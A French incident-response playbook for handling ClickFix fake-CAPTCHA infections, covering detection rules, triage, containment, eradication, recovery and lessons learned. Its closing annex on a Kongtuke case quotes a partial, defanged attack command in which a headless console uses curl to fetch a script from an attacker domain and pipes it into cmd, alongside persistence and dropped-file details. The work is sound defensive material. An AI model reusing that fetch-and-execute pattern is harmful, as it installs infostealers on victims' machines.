# Playbook : réponse à une infection ClickFix

Ce playbook suit le modele: "IRM (CERT-SG / CERT Advens), 6 étapes"

---

## En-tête

| | |
| --- | --- |
| **Menace** | ClickFix : l'utilisateur exécute lui-même une commande malveillante copiée depuis une fausse page web |
| **Déclencheurs** | alerte EDR ou SIEM, alerte proxy ou DNS|
| **Rôles** | analyste SOC N1, analyste N2, support IT, équipe réseau, RSSI et service juridique |
| **Version** | 1.0, 2026-10-13 |

---

## Étape 1 : Préparation

**Objectif :** ce qui doit être en place *avant* l'incident pour pouvoir le traiter.

**Journaux**
- [ ] Collecter les créations de processus avec Sysmon (Event ID 1 : ligne de commande, processus parent, hash) et les envoyer au SIEM.
- [ ] Collecter les modifications de registre (Sysmon Event ID 13).

**Détection**
- [ ] Alerter si `conhost.exe` est lancé avec l'option `--headless`.
- [ ] Alerter si `curl.exe` est lancé par `cmd.exe` avec une URL en argument (hors postes développeurs et administrateurs).
- [ ] Alerter si `node.exe` s'exécute depuis `C:\Users\*\AppData\`, ou exécute un fichier qui n'est pas un `.js`.
- [ ] Alerter si une valeur est ajoutée dans une clé Run et pointe vers `AppData`.

**Prévention**
- [ ] Restreindre l'accès à `cmd.exe` et à PowerShell pour les utilisateurs standards.
- [ ] Désactiver la fenêtre Exécuter (Win+R) pour les utilisateurs standards.
- [ ] Bloquer l'exécution de programmes depuis les dossiers de l'utilisateur (AppData, Téléchargements).
- [ ] Sensibiliser : aucun site légitime ne demande de coller une commande dans Windows pour « prouver qu'on n'est pas un robot ».

**Contacts**

| Rôle | Pourquoi |
| --- | --- |
| Analyste SOC N2 | investigation approfondie |
| Responsable SOC | décision si le N2 est injoignable |
| RSSI | décision de crise |
| Support IT | récupérer, isoler ou réinstaller le poste |
| Équipe réseau | bloquer les domaines sur le proxy, le DNS, le pare-feu |
| Service juridique / conformité | si des données personnelles ont pu être volées (notification à la CNIL sous 72h) |

## Étape 2 : Identification

**Objectif :** confirmer l'incident et en mesurer l'étendue.

**Confirmer (vrai positif ?)**
- [ ] Examiner l'arbre des processus : `explorer.exe` → `conhost.exe --headless` → `cmd.exe` → `curl.exe` / `cmd.exe`. Un `conhost` lancé par `explorer.exe` signifie une commande tapée dans Win+R.
- [ ] Lire la ligne de commande complète : wildcards (`cu??.e??`, `cm?.e??`), URL découpée dans des variables, `curl` dont la sortie part vers `cmd`.
- [ ] Chercher les fichiers déposés dans `AppData\Local` et `AppData\Roaming` à l'heure de l'alerte : programmes inappropriés (`node.exe`…) sur un poste ni développeur ni administrateur, fichiers dont l'extension ne correspond pas au contenu (`reader.pdf`).
- [ ] Vérifier les clés Run de l'utilisateur : une nouvelle valeur pointe-t-elle vers ces fichiers ?

> Si les trois premiers points sont confirmés = vrai positif -> passer directement au **confinement**.

**Interroger l'utilisateur**
- [ ] Avez-vous vu une page vous demandant de « vérifier que vous n'êtes pas un robot » en copiant une commande dans Windows (touches Windows + R) ?
- [ ] Sur quel site étiez-vous, et comment y êtes-vous arrivé (recherche, lien reçu par e-mail, publicité) ?
- [ ] Vers quelle heure ?
- [ ] Avez-vous transmis ce lien à des collègues ?
- [ ] Avez-vous remarqué quelque chose ensuite (fenêtre, lenteur, demande de mot de passe) ?
- [ ] Quels comptes utilisez-vous sur ce poste (messagerie, sites avec mots de passe enregistrés) ?
- [ ] Lui demander de ne pas éteindre ou redémarrer le poste, et de ne plus l'utiliser.

**Mesurer l'étendue**
- [ ] Chercher dans les journaux proxy et DNS tous les postes qui ont contacté les domaines de l'attaque (fausse page et C2), depuis leur première apparition.
- [ ] Relancer les règles de détection de l'étape 1 sur tout le parc.
- [ ] Rechercher les IOC (hashes, chemins de fichiers, valeur Run) sur tous les postes avec l'EDR ou une règle YARA.
- [ ] Vérifier dans le SIEM les tentatives de déplacement latéral : connexions du poste vers d'autres machines internes (SMB, RDP), connexions du compte de l'utilisateur ailleurs.
- [ ] Retracer dans l'EDR les actions du malware : fichiers lus (bases de mots de passe des navigateurs), connexions sortantes.

**Escalader**
- [ ] Escalader au N2 si au moins un de ces cas se présente :
  - plusieurs postes sont touchés ;
  - le compte touché est privilégié (administrateur, compte de service, direction) ;
  - le poste a accès à des données sensibles, ou des signes de vol de données existent ;
  - un déplacement latéral est détecté ;
  - l'analyste a un doute.
- [ ] Si des données personnelles ont pu être volées : informer le RSSI.

## Étape 3 : Confinement

**Objectif :** empêcher l'attaque de continuer ou de s'étendre, sans détruire les preuves.

**Isoler**
- [ ] Isoler le poste du réseau sans l'éteindre : isolation EDR en priorité, sinon port du switch coupé ou VLAN de quarantaine (équipe réseau), sinon câble débranché et Wi-Fi désactivé.

> Ne pas éteindre : la mémoire contient des preuves (processus, connexions, code déchiffré), un redémarrage effacerait une partie des preuves.

**Bloquer**
- [ ] Bloquer les domaines de l'attaque (fausse page et C2) sur le proxy
- [ ] Bloquer les IP correspondantes sur le pare-feu.
- [ ] Ajouter les hashes des fichiers malveillants à la liste de blocage de l'EDR.

**Protéger le compte**
- [ ] Désactiver le compte de domaine de l'utilisateur, ou réinitialiser son mot de passe depuis un poste sain.
- [ ] Révoquer ses sessions ouvertes (Microsoft 365 / Entra ID, VPN, applications SSO) : les infostealers volent aussi les cookies de session, qui contournent le mot de passe et le MFA.
- [ ] Surveiller les connexions de ce compte (heure, pays, appareil inhabituels).

**Collecter les preuves** (avant tout nettoyage)
- [ ] Collecter dans l'ordre de volatilité :
  1. mémoire vive ;
  2. processus et connexions réseau actifs ;
  3. dossiers `AppData` concernés (Local, Roaming) ;
  4. registre de l'utilisateur (Clés Run et RunMRU) ;
  5. journaux Sysmon et Sécurité, historique du navigateur.
- [ ] Calculer le hash (SHA256) de chaque élément et tenir la chaîne de custody (qui, quand, comment).

## Étape 4 : Éradication

**Objectif :** supprimer complètement la menace.

**Réinstaller**
- [ ] Réinstaller le poste à partir d'une image de référence saine plutôt que le nettoyer : le code malveillant étant obfusqué, on ne peut pas établir toutes ses actions (persistance cachée, charge en sommeil).
- [ ] Restaurer les données de l'utilisateur depuis une sauvegarde antérieure à l'infection, ou après les avoir scannées, sans jamais restaurer les programmes ni le dossier `AppData`.

> Si la réinstallation est impossible immédiatement (poste critique, pas d'image disponible) :
> - [ ] Supprimer les fichiers et dossiers déposés par l'attaquant (identifiés à l'étape 2), sans toucher au reste du profil.
> - [ ] Supprimer la valeur de persistance ajoutée dans la clé Run.
> - [ ] Vérifier les autres emplacements de persistance : autres clés Run et RunOnce, tâches planifiées, services, dossier Démarrage.
> - [ ] Rescanner le poste (EDR, antivirus, règle YARA), le maintenir sous surveillance renforcée et planifier la réinstallation.

**Réinitialiser les accès**
- [ ] Faire réinitialiser par l'utilisateur, depuis un poste sain, tous les mots de passe enregistrés dans ses navigateurs.
- [ ] Renouveler les autres secrets présents sur le poste : clés VPN, clés SSH, clés API.
- [ ] Si un compte administrateur s'est connecté sur le poste, réinitialiser ce compte, ainsi que le mot de passe administrateur local.
- [ ] Activer ou renforcer le MFA sur les comptes concernés.

## Étape 5 : Rétablissement

**Objectif :** revenir à la normale en sécurité.

**Avant de rendre le poste**
- [ ] Poste réinstallé à jour (système, navigateur) et conforme à l'image de référence.
- [ ] Agents de détection installés et opérationnels : EDR et Sysmon remontent bien leurs événements au SIEM (vérifier qu'un événement de test arrive).
- [ ] Scan complet sans détection (EDR, antivirus, règle YARA).
- [ ] Aucune tentative de connexion vers les domaines malveillants pendant une période d'observation, le poste restant en réseau de quarantaine.
- [ ] Nouveaux mots de passe en place et MFA actif pour l'utilisateur.
- [ ] Utilisateur informé : ce qui s'est passé et comment reconnaître un ClickFix.

**Après la remise en service**
- [ ] Surveiller le poste de façon renforcée pendant 30 jours :
  - tentatives de connexion vers les domaines bloqués ;
  - déclenchement des règles de détection liées à l'exécution du ClickFix ;
  - tentatives de déplacement latéral ;
  - désactivation des outils de sécurité (arrêt de l'EDR ou de Sysmon, modification de Defender).
- [ ] Surveiller les comptes de l'utilisateur pendant la même période : connexions depuis un pays, une heure ou un appareil inhabituels.
## Étape 6 : Retour d'expérience

**Objectif :** tirer les leçons de l'incident pour mieux se protéger.

**Documenter**
- [ ] Rédiger le rapport d'incident : chronologie, IOC, actions menées, décisions, durées (de l'infection à l'isolement).
- [ ] Partager les IOC avec les partenaires de confiance (CERT sectoriel, plateforme MISP).

**Analyser les écarts (gap analysis)**
- [ ] Comparer l'état qui a permis l'infection et l'état actuel du système : quelles mesures manquaient (journaux, règles, filtrage web) ? Lesquelles sont maintenant en place ? Lesquelles restent à faire ?
- [ ] Interdire aux postes de sortir sur Internet autrement que par le proxy, si ce n'est pas déjà le cas.

**Tester**
- [ ] Rejouer l'attaque en environnement de test avec une commande inoffensive : les règles liées à l'exécution du ClickFix déclenchent-elles bien une alerte ?
- [ ] Organiser une campagne de simulation de phishing de type ClickFix (commande sans danger qui signale simplement le clic), avec l'accord de la direction et en informant ensuite les participants.

**Améliorer**
- [ ] Sensibiliser l'ensemble des utilisateurs aux faux CAPTCHA et aux infostealers.
- [ ] Mettre à jour ce playbook avec ce qui a manqué ou mal fonctionné.

---

## Annexe : exemple Kongtuke (septembre 2026)

Cas réel analysé dans le [write-up Kongtuke / ClickFix](../../malware/2026-09-11-kongtuke-clickfix/) :

- **Piège** : script injecté dans un site légitime (quadcinema[.]com), fausse vérification servie par hodkiewhcz[.]sbs.
- **Commande** : `conhost --headless cmd /v /c "... where cu??.e?? ... where cm?.e?? ... curl -s https://winrun2915[.]com/... | cmd"`.
- **Fichiers déposés** : Node.js + `reader.pdf` (JavaScript obfusqué) dans `AppData\Local`, `TRegSvr.exe` (légitime) + `vclimg370.bpl` (chargeur, DLL side-loading) dans `AppData\Roaming`.
- **Persistance** : valeur « Microsoft » dans `HKCU\...\CurrentVersion\Run`, qui lance `node.exe reader.pdf` à chaque ouverture de session.
- **Éléments caractéristiques du ClickFix** : commande collée dans Win+R (parent explorer.exe), exécutée sans fenêtre (conhost --headless), qui télécharge et exécute un script (curl → cmd).
- **Éléments propres à Kongtuke** : node.exe exécutant un faux PDF depuis AppData, persistance par la valeur Run « Microsoft ».
